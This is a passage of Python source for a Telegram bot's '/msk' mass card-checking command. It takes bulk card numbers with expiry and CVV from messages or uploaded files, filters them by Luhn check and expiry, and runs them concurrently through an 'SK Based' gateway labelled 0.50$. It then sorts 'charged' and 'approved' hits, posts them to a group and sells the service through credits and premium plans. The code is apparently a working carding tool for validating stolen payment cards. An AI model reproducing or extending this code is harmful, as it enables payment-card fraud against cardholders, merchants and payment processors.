
    if is_session_stopped(session_id):
        return

    # BIN lookup
    try:
        bin_data = await get_bin_info(cc_num[:6])
    except Exception:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    print(f"[MSK] {cc_formatted} | {status_raw} | {response_msg}")
    logging.info(f"[MSK] {cc_formatted} | {status_raw} | {response_msg}")
    s["checked"] += 1

    elapsed = time.time() - check_started
    card_result = {
        "time_take": elapsed,
        "card":     cc_formatted,
        "response": response_msg,
        "bin_info": bin_data,
        "gateway":  "SK Based",
        "timestamp": datetime.now().isoformat(),
    }

    if is_session_stopped(session_id):
        return

    if status_raw == "CHARGED":
        s["charged"] += 1
        s["charged_cards"].append(card_result)
        await asyncio.gather(
            asyncio.to_thread(update_user_stats,        user_id, True),
            asyncio.to_thread(increment_lifetime_stats, user_id, 1, 0, 0),
            asyncio.to_thread(log_hit_to_msk,           user_id, user_obj.username, user_obj.first_name),
            asyncio.to_thread(deduct_credits_atomic,    user_id, 2),
        )
        if not is_session_stopped(session_id):
            await asyncio.gather(
                send_hit_log_to_group(bot, response_msg, user_obj, plan_name),
                send_charged_dm(bot, cc_formatted, response_msg, bin_data, user_obj, plan_name, elapsed),
            )

    elif status_raw == "APPROVED":
        s["approved"] += 1
        s["approved_cards"].append(card_result)
        await asyncio.gather(
            asyncio.to_thread(update_user_stats,        user_id, False),
            asyncio.to_thread(increment_lifetime_stats, user_id, 0, 1, 0),
            asyncio.to_thread(deduct_credits_atomic,    user_id, 1),
        )
        if not is_session_stopped(session_id):
            await send_approved_dm(bot, cc_formatted, response_msg, bin_data, user_obj, plan_name, elapsed)

    elif status_raw == "DECLINED":
        s["dead"] += 1
        s["dead_cards"].append(card_result)
        await asyncio.gather(
            asyncio.to_thread(update_user_stats,        user_id, False),
            asyncio.to_thread(increment_lifetime_stats, user_id, 0, 0, 1),
            asyncio.to_thread(deduct_credits_atomic,    user_id, 1),
        )

    else:  # ERROR
        s["errors"] += 1
        s["error_cards"].append(card_result)

    if is_session_stopped(session_id):
        return

    if s["checked"] % 3 == 0 or s["checked"] == s["total"]:
        await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msk"))
async def msk_command(message: types.Message):

    # Gate check
    if not await asyncio.to_thread(is_gate_enabled, GATE_KEY):
        await message.reply(
            "🚧 <b>Mass SK Based is under Maintenance.</b>",
            parse_mode="HTML"
        )
        return

    user    = message.from_user
    user_id = user.id
    bot     = message.bot

    # Premium only
    is_premium, _ = get_premium_status(user_id)
    if not is_premium:
        await message.reply(
            "<b>💎 Pʟᴇᴀsᴇ Uᴘɢʀᴀᴅᴇ Yᴏᴜʀ Pʟᴀɴ Tᴏ Usᴇ Tʜɪs Fᴇᴀᴛᴜʀᴇ.</b>\n\n"
            "👉 <b>Usᴇ /plan Tᴏ Uᴘɢʀᴀᴅᴇ.</b>",
            parse_mode="HTML"
        )
        return

    # Active session check
    for sid, sd in list(MSK_SESSIONS.items()):
        if sd.get("user_id") == user_id and sd.get("status") == "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
            await message.reply(
                "⚠️ <b>Aᴄᴛɪᴠᴇ Sᴇssɪᴏɴ</b>\n\n"
                "You already have a check running.\n"
                "Use the <b>🛑 Stop</b> button to stop it.",
                parse_mode="HTML"
            )
            return

    # Extract cards
    raw_text = ""
    if len(message.text.split()) > 1:
        raw_text += " ".join(message.text.split()[1:]) + " "
    if message.reply_to_message:
        rm = message.reply_to_message
        raw_text += (rm.text or rm.caption or "") + " "

    document = message.document
    if not document and message.reply_to_message and message.reply_to_message.document:
        document = message.reply_to_message.document

    if document:
        if document.file_size > 5 * 1024 * 1024:
            await message.reply("❌ File too large. Max 5MB.")
            return
        try:
            file     = await bot.get_file(document.file_id)
            byte_io  = await bot.download_file(file.file_path)
            raw_text += byte_io.read().decode("utf-8", errors="ignore")
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "❌ <b>No cards found.</b>\n\n"
            "• <code>/msk cc|mm|yy|cvv</code>\n"
            "• Reply to a message with cards using <code>/msk</code>\n"
            "• Send a .txt file with <code>/msk</code>",
            parse_mode="HTML"
        )
        return

    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found.")
        return

    # Validate cards
    valid_cards     = []
    expired_count   = 0
    invalid_count   = 0
    now_dt          = datetime.now()
    cur_year        = now_dt.year % 100
    cur_month       = now_dt.month

    for card_string in extracted_cards:
        if len(valid_cards) >= MAX_CARDS:
            break
        parts = card_string.split("|")
        if len(parts) != 4:
            continue
        cc, mm, yy, cvv = parts
        if not luhn_check(cc):
            invalid_count += 1
            continue
        try:
            exp_year  = int(yy)
            exp_month = int(mm)
            if exp_year < cur_year or (exp_year == cur_year and exp_month < cur_month):
                expired_count += 1
                continue
        except Exception:
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        info = ""
        if invalid_count or expired_count:
            info = f"Filtered {invalid_count} invalid & {expired_count} expired.\n"
        await message.reply(f"{info}❌ No valid cards to check.", parse_mode="HTML")
        return

    # Credit check
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if (current_credits or 0) < total_cards:
        await message.reply(
            f"❌ <b>Iɴsᴜꜰꜰɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
            f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.\n\n"
            f"Please add more credits or reduce the number of cards.",
            parse_mode="HTML"
        )
        return

    # Create session
    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name  = await get_user_plan_name(user_id)

    initial_text = (
        f"<a href='https://t.me/broken_wiz'>[᯼]</a> <b>Gᴀᴛᴇ ➺</b> <b>SK Bᴀsᴇᴅ | 0.50$ | Mass</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"      <a href='https://t.me/broken_wiz'>[◈]</a> <b>Sᴛᴀᴛᴜs ➺</b> Cʜᴇᴄᴋɪɴɢ… "
        f"<tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>\n"
        f"      <a href='https://t.me/broken_wiz'>[ᱯ]</a> <b>Sᴇssɪᴏɴ ID ➺</b> <code>{session_id}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Cʜᴇᴄᴋᴇᴅ ➺</b> <code>「 0/{total_cards} 」</code>\n"
        f"♘ <b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ ➺</b> <b>0</b> "
        f"<tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"♞ <b>ᏟꮋꭺꭱƦᏽꭼꭰ ➺</b> <b>0</b> "
        f"<tg-emoji emoji-id=\"5427168083074628963\">💎</tg-emoji>\n"
        f"<b>Dᴇᴄʟɪɴᴇᴅ ➺</b> <b>0</b> "
        f"<tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>\n"
        f"<b>Eʀʀᴏʀ ➺</b> <b>0</b> "
        f"<tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji>\n"
        f"<b>Eʟᴀᴘsᴇᴅ ➺</b> <b>0s</b> "
        f"<tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji>\n"
        f"<b>Dᴇᴠ ➺</b> <a href='https://t.me/broken_wiz'>𒉼 𝔦 乙</a> <tg-emoji emoji-id=\"5260681660189408650\">🏆</tg-emoji> "
        f"<tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji>"
    )

    progress_msg = await message.reply(
        initial_text,
        parse_mode="HTML",
        reply_markup=get_result_buttons(session_id, is_running=True),
        disable_web_page_preview=True
    )

    MSK_SESSIONS[session_id] = {
        "session_id":    session_id,
        "status":        "<b>Cʜᴇᴄᴋɪɴɢ…</b>",
        "chat_id":       message.chat.id,
        "user_id":       user_id,
        "msg_id":        progress_msg.message_id,
        "user_msg_id":   message.message_id,
        "total":         total_cards,
        "checked":       0,
        "approved":      0,
        "charged":       0,
        "dead":          0,
        "errors":        0,
        "start_time":    time.time(),
        "tasks":         [],
        "last_text":     "",
        "last_update_time": 0,
        "approved_cards":   [],
        "charged_cards":    [],
        "dead_cards":       [],
        "error_cards":      [],
        "user_obj":      user,
        "plan_name":     plan_name,
    }

    print(f"🚀 [MSK] Started - {total_cards} cards - User: {user_id}")
    logging.info(f"🚀 [MSK] Started - {total_cards} cards - User: {user_id}")
    asyncio.create_task(run_mass_sk(bot, session_id, valid_cards, user, plan_name))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS WORKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_mass_sk(bot: Bot, session_id: str, cards: list, user_obj, plan_name: str):
    s = MSK_SESSIONS.get(session_id)
    if not s:
        return

    sem = asyncio.Semaphore(CONCURRENCY)

    async def worker(cc_formatted: str, cc_num: str):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    s["user_id"], bot, user_obj, plan_name
                )
            except asyncio.CancelledError:
                print(f"🛑 [MSK] Task cancelled: {cc_formatted}")
                logging.info(f"🛑 [MSK] Task cancelled: {cc_formatted}")
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    print(f"[MSK ERROR] Worker error {cc_formatted}: {e}")
                    logging.error(f"[MSK] Worker error {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        s["tasks"].append(task)

    print(f"📋 [MSK] {len(tasks)} tasks created")
    logging.info(f"📋 [MSK] {len(tasks)} tasks created")

    if tasks:
        results   = await asyncio.gather(*tasks, return_exceptions=True)
        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        errors    = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))
        if cancelled:
            print(f"🛑 [MSK] {cancelled} tasks cancelled")
            logging.info(f"🛑 [MSK] {cancelled} tasks cancelled")
        if errors:
            print(f"[MSK] {errors} tasks failed with exceptions")
            logging.error(f"[MSK] {errors} tasks failed")

    s = MSK_SESSIONS.get(session_id)
    if s and s["status"] != "<b>Sᴛᴏᴘᴘᴇᴅ</b>":
        s["status"]    = "<b>Sᴜᴍᴍᴀʀʏ</b>"
        s["last_text"] = ""
        await update_progress_message(bot, session_id)
        print(f"✅ [MSK] Completed - A:{s['approved']} C:{s['charged']} D:{s['dead']} E:{s['errors']}")
        logging.info(f"✅ [MSK] Completed - A:{s['approved']} C:{s['charged']} D:{s['dead']} E:{s['errors']}")
    elif s and s["status"] == "<b>Sᴛᴏᴘᴘᴇᴅ</b>":
        print(f"🛑 [MSK] Stopped - A:{s['approved']} C:{s['charged']} D:{s['dead']} Checked:{s['checked']}")
        logging.info(f"🛑 [MSK] Stopped - A:{s['approved']} C:{s['charged']} D:{s['dead']} Checked:{s['checked']}")
